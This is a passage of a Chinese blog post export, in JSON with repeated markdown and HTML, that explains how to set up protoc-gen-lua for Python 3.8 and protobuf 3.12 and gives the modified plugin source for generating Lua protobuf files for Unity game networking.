protobuf.EnumValueDescriptor();\\n\"% obj_name\n        )\n\n        context = Writer(obj_name)\n        context('.name = \"%s\"\\n' % enum_value.name)\n        context('.index = %d\\n' % index)\n        context('.number = %d\\n' % enum_value.number)\n\n        env.context.append(context.getvalue())\n        return obj_name\n\n    def code_gen_enum(enum_desc, env):\n        env.enter(enum_desc.name)\n        full_name = env.get_local_name()\n        obj_name = full_name.upper().replace('.', '_')\n        env.descriptor.append(\n            \"local %s = protobuf.EnumDescriptor();\\n\"% obj_name\n        )\n\n        context = Writer(obj_name)\n        context('.name = \"%s\"\\n' % enum_desc.name)\n        context('.full_name = \"%s\"\\n' % env.get_global_name())\n\n        values = []\n        for i, enum_value in enumerate(enum_desc.value):\n            values.append(code_gen_enum_item(i, enum_value, env))\n        context('.values = {%s}\\n' % ','.join(values))\n\n        env.context.append(context.getvalue())\n        env.exit()\n        return obj_name\n\n    def code_gen_field(index, field_desc, env):\n        full_name = env.get_local_name() + '.' + field_desc.name\n        obj_name = full_name.upper().replace('.', '_') + '_FIELD'\n        env.descriptor.append(\n            \"local %s = protobuf.FieldDescriptor();\\n\"% obj_name\n        )\n\n        context = Writer(obj_name)\n\n        context('.name = \"%s\"\\n' % field_desc.name)\n        context('.full_name = \"%s\"\\n' % (\n            env.get_global_name() + '.' + field_desc.name))\n        context('.number = %d\\n' % field_desc.number)\n        context('.index = %d\\n' % index)\n        context('.label = %d\\n' % field_desc.label)\n\n        if field_desc.HasField(\"default_value\"):\n            context('.has_default_value = true\\n')\n            value = field_desc.default_value\n            if field_desc.type == FDP.TYPE_STRING:\n                context('.default_value = \"%s\"\\n'%value)\n            else:\n                context('.default_value = %s\\n'%value)\n        else:\n            context('.has_default_value = false\\n')\n            if field_desc.label == FDP.LABEL_REPEATED:\n                default_value = \"{}\"\n            elif field_desc.HasField('type_name'):\n                default_value = \"nil\"\n            else:\n                default_value = DEFAULT_VALUE[field_desc.type]\n            context('.default_value = %s\\n' % default_value)\n\n        if field_desc.HasField('type_name'):\n            type_name = env.get_ref_name(field_desc.type_name).upper().replace('.', '_')\n            if field_desc.type == FDP.TYPE_MESSAGE:\n                context('.message_type = %s\\n' % type_name)\n            else:\n                context('.enum_type = %s\\n' % type_name)\n\n        if field_desc.HasField('extendee'):\n            type_name = env.get_ref_name(field_desc.extendee)\n            env.register.append(\n                \"%s.RegisterExtension(%s)\\n\" % (type_name, obj_name)\n            )\n\n        context('.type = %d\\n' % field_desc.type)\n        context('.cpp_type = %d\\n\\n' % CPP_TYPE[field_desc.type])\n        env.context.append(context.getvalue())\n        return obj_name\n\n    def code_gen_message(message_descriptor, env, containing_type = None):\n        env.enter(message_descriptor.name)\n        full_name = env.get_local_name()\n        obj_name = full_name.upper().replace('.', '_')\n        env.descriptor.append(\n            \"local %s = protobuf.Descriptor();\\n\"% obj_name\n        )\n\n        context = Writer(obj_name)\n        context('.name = \"%s\"\\n' % message_descriptor.name)\n        context('.full_name = \"%s\"\\n' % env.get_global_name())\n\n        nested_types = []\n        for msg_desc in message_descriptor.nested_type:\n            msg_name = code_gen_message(msg_desc, env, obj_name)\n            nested_types.append(msg_name)\n        context('.nested_types = {%s}\\n' % ', '.join(nested_types))\n\n        enums = []\n        for enum_desc in message_descriptor.enum_type:\n            enums.append(code_gen_enum(enum_desc, env))\n        context('.enum_types = {%s}\\n' % ', '.join(enums))\n\n        fields = []\n        for i, field_desc in enumerate(message_descriptor.field):\n            fields.append(code_gen_field(i, field_desc, env))\n\n        context('.fields = {%s}\\n' % ', '.join(fields))\n        if len(message_descriptor.extension_range) > 0:\n            context('.is_extendable = true\\n')\n        else:\n            context('.is_extendable = false\\n')\n\n        extensions = []\n        for i, field_desc in enumerate(message_descriptor.extension):\n            extensions.append(code_gen_field(i, field_desc, env))\n        context('.extensions = {%s}\\n' % ', '.join(extensions))\n\n        if containing_type:\n            context('.containing_type = %s\\n' % containing_type)\n\n        env.message.append('%s = protobuf.Message(%s)\\n' % (full_name,\n                                                            obj_name))\n\n        env.context.append(context.getvalue())\n        env.exit()\n\n        # print('\\n'+str(env.descriptor)+\"\\n\")\n        # print('\\n'+str(env.context)+\"\\n\")\n        # print('\\n'+str(env.message)+\"\\n\")\n        # print('\\n'+str(env.register)+\"\\n\")\n        # print('\\n'+str(env.filename)+\"\\n\")\n        return obj_name\n\n    def write_header(writer):\n        writer(\"\"\"-- Generated By protoc-gen-lua Do not Edit\n    \"\"\")\n\n    def code_gen_file(proto_file, env, is_gen):\n        filename = path.splitext(proto_file.name)[0]\n        env.enter_file(filename, proto_file.package)\n\n        includes = []\n        for f in proto_file.dependency:\n            inc_file = path.splitext(f)[0]\n            includes.append(inc_file)\n\n    #    for field_desc in proto_file.extension:\n    #        code_gen_extensions(field_desc, field_desc.name, env)\n\n        for enum_desc in proto_file.enum_type:\n            code_gen_enum(enum_desc, env)\n            for enum_value in enum_desc.value:\n                env.message.append('%s = %d\\n' % (enum_value.name,\n                                                enum_value.number))\n\n        for msg_desc in proto_file.message_type:\n            code_gen_message(msg_desc, env)\n\n        if is_gen:\n            lua = Writer()\n            write_header(lua)\n            lua('local protobuf = require \"protobuf\"\\n')\n            for i in includes:\n                lua('local %s_pb = require(\"%s_pb\")\\n' % (i, i))\n            lua(\"module('%s_pb')\\n\" % env.filename)\n\n            lua('\\n\\n')\n            for des in env.descriptor:\n                lua(des)\n            lua('\\n')\n            for con in env.context:\n                lua(con)\n            lua('\\n')\n            env.message.sort()\n            for msg in env.message:\n                lua(msg)\n            lua('\\n')\n            for reg in env.register:\n                lua(reg)\n\n            # print('\\n'+str(env.descriptor)+\"\\n\")\n            # print('\\n'+str(env.context)+\"\\n\")\n            # print('\\n'+str(env.message)+\"\\n\")\n            # print('\\n'+str(env.register)+\"\\n\")\n            # print('\\n'+str(env.filename)+\"\\n\")\n            # print('\\n'+str(lua.getvalue())+\"\\n\")\n\n            _files[env.filename+ '_pb.lua'] = lua.getvalue()\n        env.exit_file()\n\n    def main():\n        plugin_require_bin = sys.stdin.buffer.read()\n        # print(plugin_require_bin.decode(\"utf-8\",\"ignore\"))\n        code_gen_req = plugin_pb2.CodeGeneratorRequest()\n        code_gen_req.ParseFromString(plugin_require_bin)\n\n        env = Env()\n        for proto_file in code_gen_req.proto_file:\n            code_gen_file(proto_file, env,\n                    proto_file.name in code_gen_req.file_to_generate)\n\n        code_generated = plugin_pb2.CodeGeneratorResponse()\n        for k in  _files:\n            file_desc = code_generated.file.add()\n            file_desc.name = k\n            file_desc.content = _files[k]\n        \n        sys.stdout.buffer.write(code_generated.SerializeToString())\n        for k in  _files:\n            try:\n                with open(r\"xxx/protoc-gen-lua-master/protobuf/luascript/\" + k, \"w+\") as lua_file:\n                    lua_file.write(_files[k])\n                # print(\"输出protocol-lua:\", k, \"正常\")                \n            except Exception as e:\n                # print(\"输出lua报错,请检查\")\n                print(\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxx\",str(e))\n\n\n    if __name__ == \"__main__\":\n        main()\n\n\n\n\n```\n\n* 5.按照protoc-gen-lua-master文件中的解释,进行build文件,成功生成 xxx_pb.lua文件","slug":"Potobuf-Lua/ProtobufLua","published":1,"updated":"2020-05-19T14:48:09.863Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cy4000s2gk7696q2ugu","content":"<h1 id=\"python-protobuf-lua\"><a href=\"#python-protobuf-lua\" class=\"headerlink\" title=\"python protobuf lua\"></a>python protobuf lua</h1><ul>\n<li>目的:游戏开发中使用lua进行数据交互,客户端与服务器进行数据互动的时候,采用protobuf方式进行数据的交互</li>\n<li>需要生成xxx_pb.lua文件,在Unity中使用tolua进行读取,创建一个proto对象,然后发送给服务器进行使用,或者服务器发送一个proto对象过来,tolua中进行读取和解析.</li>\n</ul>\n<h1 id=\"protoc-gen-lua-最新版使用教程\"><a href=\"#protoc-gen-lua-最新版使用教程\" class=\"headerlink\" title=\"protoc-gen-lua 最新版使用教程\"></a>protoc-gen-lua 最新版使用教程</h1><ul>\n<li>老版的采用python2.7与protobuf2.5进行的数据创建 <a href=\"https://blog.csdn.net/huutu/article/details/49672225\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/huutu/article/details/49672225</a></li>\n<li>目前环境以及升级到了python3.8以及protobuf3.12进行生成.</li>\n<li>1:下载protobuf3.12版本,到电脑任何地方,打开里面的python文件夹,安装python3.8的环境</li>\n<li>2:下载 <a href=\"https://github.com/sean-lin/protoc-gen-lua\" target=\"_blank\" rel=\"noopener\">https://github.com/sean-lin/protoc-gen-lua</a> 我们会修改里面的东西</li>\n<li>2:三步走</li>\n</ul>\n<pre><code>    python setup.py install 查看是否正常\n    python setup.py build 查看是否正常\n    python setup.py test 查看是否正常\n</code></pre><ul>\n<li>3:将 xxx\\protobuf-3.12.0\\python\\google\\protobuf\\compiler\\plugin_pb2.py 替换为 xxx\\protoc-gen-lua-master\\plugin\\plugin_pb2.py, 如果前面的三步走正常,会看到这个文件的</li>\n<li>4:修改protoc-gen-lua文件为以下</li>\n</ul>\n<pre><code>    # -*- coding:utf-8 -*-\n    #!/usr/bin/env python\n    # protoc-gen-erl\n    # Google&#39;s Protocol Buffers project, ported to lua.\n    # https://code.google.com/p/protoc-gen-lua/\n    #\n    # Copyright (c) 2010 , 林卓毅 (Zhuoyi Lin) netsnail@gmail.com\n    # All rights reserved.\n    #\n    # Use, modification and distribution are subject to the &quot;New BSD License&quot;\n    # as listed at &lt;url: http://www.opensource.org/licenses/bsd-license.php &gt;.\n\n    import sys\n    import os.path as path\n    from io import StringIO\n\n    import plugin_pb2\n    import google.protobuf.descriptor_pb2 as descriptor_pb2\n\n    _packages = {}\n    _files = {}\n    _message = {}\n\n    FDP = plugin_pb2.google_dot_protobuf_dot_descriptor__pb2.FieldDescriptorProto\n\n    if sys.platform == &quot;win32&quot;:\n        import msvcrt, os\n        msvcrt.setmode(sys.stdin.fileno(), os.O_BINARY)\n        msvcrt.setmode(sys.stdout.fileno(), os.O_BINARY)\n\n    class CppType:\n        CPPTYPE_INT32       = 1\n        CPPTYPE_INT64       = 2\n        CPPTYPE_UINT32      = 3\n        CPPTYPE_UINT64      = 4\n        CPPTYPE_DOUBLE      = 5\n        CPPTYPE_FLOAT       = 6\n        CPPTYPE_BOOL        = 7\n        CPPTYPE_ENUM        = 8\n        CPPTYPE_STRING      = 9\n        CPPTYPE_MESSAGE     = 10\n\n    CPP_TYPE ={\n        FDP.TYPE_DOUBLE         : CppType.CPPTYPE_DOUBLE,\n        FDP.TYPE_FLOAT          : CppType.CPPTYPE_FLOAT,\n        FDP.TYPE_INT64          : CppType.CPPTYPE_INT64,\n        FDP.TYPE_UINT64         : CppType.CPPTYPE_UINT64,\n        FDP.TYPE_INT32          : CppType.CPPTYPE_INT32,\n        FDP.TYPE_FIXED64        : CppType.CPPTYPE_UINT64,\n        FDP.TYPE_FIXED32        : CppType.CPPTYPE_UINT32,\n        FDP.TYPE_BOOL           : CppType.CPPTYPE_BOOL,\n        FDP.TYPE_STRING         : CppType.CPPTYPE_STRING,\n        FDP.TYPE_MESSAGE        : CppType.CPPTYPE_MESSAGE,\n        FDP.TYPE_BYTES          : CppType.CPPTYPE_STRING,\n        FDP.TYPE_UINT32         : CppType.CPPTYPE_UINT32,\n        FDP.TYPE_ENUM           : CppType.CPPTYPE_ENUM,\n        FDP.TYPE_SFIXED32       : CppType.CPPTYPE_INT32,\n        FDP.TYPE_SFIXED64       : CppType.CPPTYPE_INT64,\n        FDP.TYPE_SINT32         : CppType.CPPTYPE_INT32,\n        FDP.TYPE_SINT64         : CppType.CPPTYPE_INT64\n    }\n\n    def printerr(*args):\n        sys.stderr.write(&quot; &quot;.join(args))\n        sys.stderr.write(&quot;\\n&quot;)\n        sys.stderr.flush()\n\n    class TreeNode(object):\n        def __init__(self, name, parent=None, filename=None, package=None):\n            super(TreeNode, self).__init__()\n            self.child = []\n            self.parent = parent\n            self.filename = filename\n            self.package = package\n            if parent:\n                self.parent.add_child(self)\n            self.name = name\n\n        def add_child(self, child):\n            self.child.append(child)\n\n        def find_child(self, child_names):\n            if child_names:\n                for i in self.child:\n                    if i.name == child_names[0]:\n                        return i.find_child(child_names[1:])\n                raise StandardError\n            else:\n                return self\n\n        def get_child(self, child_name):\n            for i in self.child:\n                if i.name == child_name:\n                    return i\n            return None\n\n        def get_path(self, end = None):\n            pos = self\n            out = []\n            while pos and pos != end:\n                out.append(pos.name)\n                pos = pos.parent\n            out.reverse()\n            return &#39;.&#39;.join(out)\n\n        def get_global_name(self):\n            return self.get_path()\n\n        def get_local_name(self):\n            pos = self\n            while pos.parent:\n                pos = pos.parent\n                if self.package and pos.name == self.package[-1]:\n                    break\n            return self.get_path(pos)\n\n        def __str__(self):\n            return self.to_string(0)\n\n        def __repr__(self):\n            return str(self)\n\n        def to_string(self, indent = 0):\n            return &#39; &#39;*indent + &#39;&lt;TreeNode &#39; + self.name + &#39;(\\n&#39; + \\\n                    &#39;,&#39;.join([i.to_string(indent + 4) for i in self.child]) + \\\n                    &#39; &#39;*indent +&#39;)&gt;\\n&#39;\n\n    class Env(object):\n        filename = None\n        package = None\n        extend = None\n        descriptor = None\n        message = None\n        context = None\n        register = None\n        def __init__(self):\n            self.message_tree = TreeNode(&#39;&#39;)\n            self.scope = self.message_tree\n\n        def get_global_name(self):\n            return self.scope.get_global_name()\n\n        def get_local_name(self):\n            return self.scope.get_local_name()\n\n        def get_ref_name(self, type_name):\n            try:\n                node = self.lookup_name(type_name)\n            except:\n                # if the child doesn&#39;t be founded, it must be in this file\n                return type_name[len(&#39;.&#39;.join(self.package)) + 1:]\n            if node.filename != self.filename:\n                return node.filename + &#39;_pb.&#39; + node.get_local_name()\n            return node.get_local_name()\n\n        def lookup_name(self, name):\n            names = name.split(&#39;.&#39;)\n            if names[0] == &#39;&#39;:\n                return self.message_tree.find_child(names[1:])\n            else:\n                return self.scope.parent.find_child(names)\n\n        def enter_package(self, package):\n            if not package:\n                return self.message_tree\n            names = package.split(&#39;.&#39;)\n            pos = self.message_tree\n            for i, name in enumerate(names):\n                new_pos = pos.get_child(name)\n                if new_pos:\n                    pos = new_pos\n                else:\n                    return self._build_nodes(pos, names[i:])\n            return pos\n\n        def enter_file(self, filename, package):\n            self.filename = filename\n            self.package = package.split(&#39;.&#39;)\n            self._init_field()\n            self.scope = self.enter_package(package)\n\n        def exit_file(self):\n            self._init_field()\n            self.filename = None\n            self.package = []\n            self.scope = self.scope.parent\n\n        def enter(self, message_name):\n            self.scope = TreeNode(message_name, self.scope, self.filename,\n                                self.package)\n\n        def exit(self):\n            self.scope = self.scope.parent\n\n        def _init_field(self):\n            self.descriptor = []\n            self.context = []\n            self.message = []\n            self.register = []\n\n        def _build_nodes(self, node, names):\n            parent = node\n            for i in names:\n                parent = TreeNode(i, parent, self.filename, self.package)\n            return parent\n\n    class Writer(object):\n        def __init__(self, prefix=None):\n            self.io = StringIO()\n            self.__indent = &#39;&#39;\n            self.__prefix = prefix\n\n        def getvalue(self):\n            return self.io.getvalue()\n\n        def __enter__(self):\n            self.__indent += &#39;    &#39;\n            return self\n\n        def __exit__(self, type, value, trackback):\n            self.__indent = self.__indent[:-4]\n\n        def __call__(self, data):\n            self.io.write(self.__indent)\n            if self.__prefix:\n                self.io.write(self.__prefix)\n            self.io.write(data)\n\n    DEFAULT_VALUE = {\n        FDP.TYPE_DOUBLE         : &#39;0.0&#39;,\n        FDP.TYPE_FLOAT          : &#39;0.0&#39;,\n        FDP.TYPE_INT64          : &#39;0&#39;,\n        FDP.TYPE_UINT64         : &#39;0&#39;,\n        FDP.TYPE_INT32          : &#39;0&#39;,\n        FDP.TYPE_FIXED64        : &#39;0&#39;,\n        FDP.TYPE_FIXED32        : &#39;0&#39;,\n        FDP.TYPE_BOOL           : &#39;false&#39;,\n        FDP.TYPE_STRING         : &#39;&quot;&quot;&#39;,\n        FDP.TYPE_MESSAGE        : &#39;nil&#39;,\n        FDP.TYPE_BYTES          : &#39;&quot;&quot;&#39;,\n        FDP.TYPE_UINT32         : &#39;0&#39;,\n        FDP.TYPE_ENUM           : &#39;1&#39;,\n        FDP.TYPE_SFIXED32       : &#39;0&#39;,\n        FDP.TYPE_SFIXED64       : &#39;0&#39;,\n        FDP.TYPE_SINT32         : &#39;0&#39;,\n        FDP.TYPE_SINT64         : &#39;0&#39;,\n    }\n\n    def code_gen_enum_item(index, enum_value, env):\n        full_name = env.get_local_name() + &#39;.&#39; + enum_value.name\n        obj_name = full_name.upper().replace(&#39;.&#39;, &#39;_&#39;) + &#39;_ENUM&#39;\n        env.descriptor.append(\n            &quot;local %s = protobuf.EnumValueDescriptor();\\n&quot;% obj_name\n        )\n\n        context = Writer(obj_name)\n        context(&#39;.name = &quot;%s&quot;\\n&#39; % enum_value.name)\n        context(&#39;.index = %d\\n&#39; % index)\n        context(&#39;.number = %d\\n&#39; % enum_value.number)\n\n        env.context.append(context.getvalue())\n        return obj_name\n\n    def code_gen_enum(enum_desc, env):\n        env.enter(enum_desc.name)\n        full_name = env.get_local_name()\n        obj_name = full_name.upper().replace(&#39;.&#39;, &#39;_&#39;)\n        env.descriptor.append(\n            &quot;local %s = protobuf.EnumDescriptor();\\n&quot;% obj_name\n        )\n\n        context = Writer(obj_name)\n        context(&#39;.name = &quot;%s&quot;\\n&#39; % enum_desc.name)\n        context(&#39;.full_name = &quot;%s&quot;\\n&#39; % env.get_global_name())\n\n        values = []\n        for i, enum_value in enumerate(enum_desc.value):\n            values.append(code_gen_enum_item(i, enum_value, env))\n        context(&#39;.values = {%s}\\n&#39; % &#39;,&#39;.join(values))\n\n        env.context.append(context.getvalue())\n        env.exit()\n        return obj_name\n\n    def code_gen_field(index, field_desc, env):\n        full_name = env.get_local_name() + &#39;.&#39; + field_desc.name\n        obj_name = full_name.upper().replace(&#39;.&#39;, &#39;_&#39;) + &#39;_FIELD&#39;\n        env.descriptor.append(\n            &quot;local %s = protobuf.FieldDescriptor();\\n&quot;% obj_name\n        )\n\n        context = Writer(obj_name)\n\n        context(&#39;.name = &quot;%s&quot;\\n&#39; % field_desc.name)\n        context(&#39;.full_name = &quot;%s&quot;\\n&#39; % (\n            env.get_global_name() + &#39;.&#39; + field_desc.name))\n        context(&#39;.number = %d\\n&#39; % field_desc.number)\n        context(&#39;.index = %d\\n&#39; % index)\n        context(&#39;.label = %d\\n&#39; % field_desc.label)\n\n        if field_desc.HasField(&quot;default_value&quot;):\n            context(&#39;.has_default_value = true\\n&#39;)\n            value = field_desc.default_value\n            if field_desc.type == FDP.TYPE_STRING:\n                context(&#39;.default_value = &quot;%s&quot;\\n&#39;%value)\n            else:\n                context(&#39;.default_value = %s\\n&#39;%value)\n        else:\n            context(&#39;.has_default_value = false\\n&#39;)\n            if field_desc.label == FDP.LABEL_REPEATED:\n                default_value = &quot;{}&quot;\n            elif field_desc.HasField(&#39;type_name&#39;):\n                default_value = &quot;nil&quot;\n            else:\n                default_value = DEFAULT_VALUE[field_desc.type]\n            context(&#39;.default_value = %s\\n&#39; % default_value)\n\n        if field_desc.HasField(&#39;type_name&#39;):\n            type_name = env.get_ref_name(field_desc.type_name).upper().replace(&#39;.&#39;, &#39;_&#39;)\n            if field_desc.type == FDP.TYPE_MESSAGE:\n                context(&#39;.message_type = %s\\n&#39; % type_name)\n            else:\n                context(&#39;.enum_type = %s\\n&#39; % type_name)\n\n        if field_desc.HasField(&#39;extendee&#39;):\n            type_name = env.get_ref_name(field_desc.extendee)\n            env.register.append(\n                &quot;%s.RegisterExtension(%s)\\n&quot; % (type_name, obj_name)\n            )\n\n        context(&#39;.type = %d\\n&#39; % field_desc.type)\n        context(&#39;.cpp_type = %d\\n\\n&#39; % CPP_TYPE[field_desc.type])\n        env.context.append(context.getvalue())\n        return obj_name\n\n    def code_gen_message(message_descriptor, env, containing_type = None):\n        env.enter(message_descriptor.name)\n        full_name = env.get_local_name()\n        obj_name = full_name.upper().replace(&#39;.&#39;, &#39;_&#39;)\n        env.descriptor.append(\n            &quot;local %s = protobuf.Descriptor();\\n&quot;% obj_name\n        )\n\n        context = Writer(obj_name)\n        context(&#39;.name = &quot;%s&quot;\\n&#39; % message_descriptor.name)\n        context(&#39;.full_name = &quot;%s&quot;\\n&#39; % env.get_global_name())\n\n        nested_types = []\n        for msg_desc in message_descriptor.nested_type:\n            msg_name = code_gen_message(msg_desc, env, obj_name)\n            nested_types.append(msg_name)\n        context(&#39;.nested_types = {%s}\\n&#39; % &#39;, &#39;.join(nested_types))\n\n        enums = []\n        for enum_desc in message_descriptor.enum_type:\n            enums.append(code_gen_enum(enum_desc, env))\n        context(&#39;.enum_types = {%s}\\n&#39; % &#39;, &#39;.join(enums))\n\n        fields = []\n        for i, field_desc in enumerate(message_descriptor.field):\n            fields.append(code_gen_field(i, field_desc, env))\n\n        context(&#39;.fields = {%s}\\n&#39; % &#39;, &#39;.join(fields))\n        if len(message_descriptor.extension_range) &gt; 0:\n            context(&#39;.is_extendable = true\\n&#39;)\n        else:\n            context(&#39;.is_extendable = false\\n&#39;)\n\n        extensions = []\n        for i, field_desc in enumerate(message_descriptor.extension):\n            extensions.append(code_gen_field(i, field_desc, env))\n        context(&#39;.extensions = {%s}\\n&#39; % &#39;, &#39;.join(extensions))\n\n        if containing_type:\n            context(&#39;.containing_type = %s\\n&#39; % containing_type)\n\n        env.message.append(&#39;%s = protobuf.Message(%s)\\n&#39; % (full_name,\n                                                            obj_name))\n\n        env.context.append(context.getvalue())\n        env.exit()\n\n        # print(&#39;\\n&#39;+str(env.descriptor)+&quot;\\n&quot;)\n        # print(&#39;\\n&#39;+str(env.context)+&quot;\\n&quot;)\n        # print(&#39;\\n&#39;+str(env.message)+&quot;\\n&quot;)\n        # print(&#39;\\n&#39;+str(env.register)+&quot;\\n&quot;)\n        # print(&#39;\\n&#39;+str(env.filename)+&quot;\\n&quot;)\n        return obj_name\n\n    def write_header(writer):\n        writer(&quot;&quot;&quot;-- Generated By protoc-gen-lua Do not Edit\n    &quot;&quot;&quot;)\n\n    def code_gen_file(proto_file, env, is_gen):\n        filename = path.splitext(proto_file.name)[0]\n        env.enter_file(filename, proto_file.package)\n\n        includes = []\n        for f in proto_file.dependency:\n            inc_file = path.splitext(f)[0]\n            includes.append(inc_file)\n\n    #    for field_desc in proto_file.extension:\n    #        code_gen_extensions(field_desc, field_desc.name, env)\n\n        for enum_desc in proto_file.enum_type:\n            code_gen_enum(enum_desc, env)\n            for enum_value in enum_desc.value:\n                env.message.append(&#39;%s = %d\\n&#39; % (enum_value.name,\n                                                enum_value.number))\n\n        for msg_desc in proto_file.message_type:\n            code_gen_message(msg_desc, env)\n\n        if is_gen:\n            lua = Writer()\n            write_header(lua)\n            lua(&#39;local protobuf = require &quot;protobuf&quot;\\n&#39;)\n            for i in includes:\n                lua(&#39;local %s_pb = require(&quot;%s_pb&quot;)\\n&#39; % (i, i))\n            lua(&quot;module(&#39;%s_pb&#39;)\\n&quot; % env.filename)\n\n            lua(&#39;\\n\\n&#39;)\n            for des in env.descriptor:\n                lua(des)\n            lua(&#39;\\n&#39;)\n            for con in env.context:\n                lua(con)\n            lua(&#39;\\n&#39;)\n            env.message.sort()\n            for msg in env.message:\n                lua(msg)\n            lua(&#39;\\n&#39;)\n            for reg in env.register:\n                lua(reg)\n\n            # print(&#39;\\n&#39;+str(env.descriptor)+&quot;\\n&quot;)\n            # print(&#39;\\n&#39;+str(env.context)+&quot;\\n&quot;)\n            # print(&#39;\\n&#39;+str(env.message)+&quot;\\n&quot;)\n            # print(&#39;\\n&#39;+str(env.register)+&quot;\\n&quot;)\n            # print(&#39;\\n&#39;+str(env.filename)+&quot;\\n&quot;)\n            # print(&#39;\\n&#39;+str(lua.getvalue())+&quot;\\n&quot;)\n\n            _files[env.filename+ &#39;_pb.lua&#39;] = lua.getvalue()\n        env.exit_file()\n\n    def main():\n        plugin_require_bin = sys.stdin.buffer.read()\n        # print(plugin_require_bin.decode(&quot;utf-8&quot;,&quot;ignore&quot;))\n        code_gen_req = plugin_pb2.CodeGeneratorRequest()\n        code_gen_req.ParseFromString(plugin_require_bin)\n\n        env = Env()\n        for proto_file in code_gen_req.proto_file:\n            code_gen_file(proto_file, env,\n                    proto_file.name in code_gen_req.file_to_generate)\n\n        code_generated = plugin_pb2.CodeGeneratorResponse()\n        for k in  _files:\n            file_desc = code_generated.file.add()\n            file_desc.name = k\n            file_desc.content = _files[k]\n\n        sys.stdout.buffer.write(code_generated.SerializeToString())\n        for k in  _files:\n            try:\n                with open(r&quot;xxx/protoc-gen-lua-master/protobuf/luascript/&quot; + k, &quot;w+&quot;) as lua_file:\n                    lua_file.write(_files[k])\n                # print(&quot;输出protocol-lua:&quot;, k, &quot;正常&quot;)                \n            except Exception as e:\n                # print(&quot;输出lua报错,请检查&quot;)\n                print(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;,str(e))\n\n\n    if __name__ == &quot;__main__&quot;:\n        main()\n\n\n\n</code></pre><ul>\n<li>5.按照protoc-gen-lua-master文件中的解释,进行build文件,成功生成 xxx_pb.lua文件</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"python-protobuf-lua\"><a href=\"#python-protobuf-lua\" class=\"headerlink\" title=\"python protobuf lua\"></a>python protobuf lua</h1><ul>\n<li>目的:游戏开发中使用lua进行数据交互,客户端与服务器进行数据互动的时候,采用protobuf方式进行数据的交互</li>\n<li>需要生成xxx_pb.lua文件,在Unity中使用tolua进行读取,创建一个proto对象,然后发送给服务器进行使用,或者服务器发送一个proto对象过来,tolua中进行读取和解析.</li>\n</ul>\n<h1 id=\"protoc-gen-lua-最新版使用教程\"><a href=\"#protoc-gen-lua-最新版使用教程\" class=\"headerlink\" title=\"protoc-gen-lua 最新版使用教程\"></a>protoc-gen-lua 最新版使用教程</h1><ul>\n<li>老版的采用python2.7与protobuf2.5进行的数据创建 <a href=\"https://blog.csdn.net/huutu/article/details/49672225\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/huutu/article/details/49672225</a></li>\n<li>目前环境以及升级到了python3.8以及protobuf3.12进行生成.</li>\n<li>1:下载protobuf3.12版本,到电脑任何地方,打开里面的python文件夹,安装python3.8的环境</li>\n<li>2:下载 <a href=\"https://github.com/sean-lin/protoc-gen-lua\" target=\"_blank\" rel=\"noopener\">https://github.com/sean-lin/protoc-gen-lua</a> 我们会修改里面的东西</li>\n<li>2:三步走</li>\n</ul>\n<pre><code>    python setup.py install 查看是否正常\n    python setup.py build 查看是否正常\n    python setup.py test 查看是否正常\n</code></pre><ul>\n<li>3:将 xxx\\protobuf-3.12.0\\python\\google\\protobuf\\compiler\\plugin_pb2.py 替换为 xxx\\protoc-gen-lua-master\\plugin\\plugin_pb2.py, 如果前面的三步走正常,会看到这个文件的</li>\n<li>4:修改protoc-gen-lua文件为以下</li>\n</ul>\n<pre><code>    # -*- coding:utf-8 -*-\n    #!/usr/bin/env python\n    # protoc-gen-erl\n    # Google&#39;s Protocol Buffers project, ported to lua.\n    # https://code.google.com/p/protoc-gen-lua/\n    #\n    # Copyright (c) 2010 , 林卓毅 (Zhuoyi Lin) netsnail@gmail.com\n    # All rights reserved.\n    #\n    # Use, modification and distribution are subject to the &quot;New BSD License&quot;\n    # as listed at &lt;url: http://www.opensource.org/licenses/bsd-license.php &gt;.\n\n    import sys\n    import os.path as path\n    from io import StringIO\n\n    import plugin_pb2\n    import google.protobuf.descriptor_pb2 as descriptor_pb2\n\n    _packages = {}\n    _files = {}\n    _message = {}\n\n    FDP = plugin_pb2.google_dot_protobuf_dot_descriptor__pb2.FieldDescriptorProto\n\n    if sys.platform == &quot;win32&quot;:\n        import msvcrt, os\n        msvcrt.setmode(sys.stdin.fileno(), os.O_BINARY)\n        msvcrt.setmode(sys.stdout.fileno(), os.O_BINARY)\n\n    class CppType:\n        CPPTYPE_INT32       = 1\n        CPPTYPE_INT64       = 2\n        CPPTYPE_UINT32      = 3\n        CPPTYPE_UINT64      = 4\n        CPPTYPE_DOUBLE      = 5\n        CPPTYPE_FLOAT       = 6\n        CPPTYPE_BOOL        = 7\n        CPPTYPE_ENUM        = 8\n        CPPTYPE_STRING      = 9\n        CPPTYPE_MESSAGE     = 10\n\n    CPP_TYPE ={\n        FDP.TYPE_DOUBLE         : CppType.CPPTYPE_DOUBLE,\n        FDP.TYPE_FLOAT          : CppType.CPPTYPE_FLOAT,\n        FDP.TYPE_INT64          : CppType.CPPTYPE_INT64,\n        FDP.TYPE_UINT64         : CppType.CPPTYPE_UINT64,\n        FDP.TYPE_INT32          : CppType.CPPTYPE_INT32,\n        FDP.TYPE_FIXED64        : CppType.CPPTYPE_UINT64,\n        FDP.TYPE_FIXED32        : CppType.CPPTYPE_UINT32,\n        FDP.TYPE_BOOL           : CppType.CPPTYPE_BOOL,\n        FDP.TYPE_STRING         : CppType.CPPTYPE_STRING,\n        FDP.TYPE_MESSAGE        : CppType.CPPTYPE_MESSAGE,\n        FDP.TYPE_BYTES          : CppType.CPPTYPE_STRING,\n        FDP.TYPE_UINT32         : CppType.CPPTYPE_UINT32,\n        FDP.TYPE_ENUM           : CppType.CPPTYPE_ENUM,\n        FDP.TYPE_SFIXED32       : CppType.CPPTYPE_INT32,\n        FDP.TYPE_SFIXED64       : CppType.CPPTYPE_INT64,\n        FDP.TYPE_SINT32         : CppType.CPPTYPE_INT32,\n        FDP.TYPE_SINT64         : CppType.CPPTYPE_INT64\n    }\n\n    def printerr(*args):\n        sys.stderr.write(&quot; &quot;.join(args))\n        sys.stderr.write(&quot;\\n&quot;)\n        sys.stderr.flush()\n\n    class TreeNode(object):\n        def __init__(self, name, parent=None, filename=None, package=None):\n            super(TreeNode, self).__init__()\n            self.child = []\n            self.parent = 